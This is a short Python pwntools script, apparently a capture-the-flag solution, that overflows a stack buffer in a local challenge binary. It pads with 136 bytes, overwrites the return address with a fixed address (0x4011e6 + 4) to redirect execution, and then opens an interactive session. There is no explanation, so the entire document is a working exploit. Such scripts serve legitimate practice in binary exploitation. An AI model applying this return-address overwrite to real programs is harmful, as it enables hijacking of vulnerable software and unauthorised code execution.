from pwn import *

context.log_level = 'debug'

context.binary = ELF('./src/chall')
io = process('./src/chall')

payload = b'A' * 136

payload += p64(0x4011e6 + 4)  

io.sendline(payload)
io.interactive()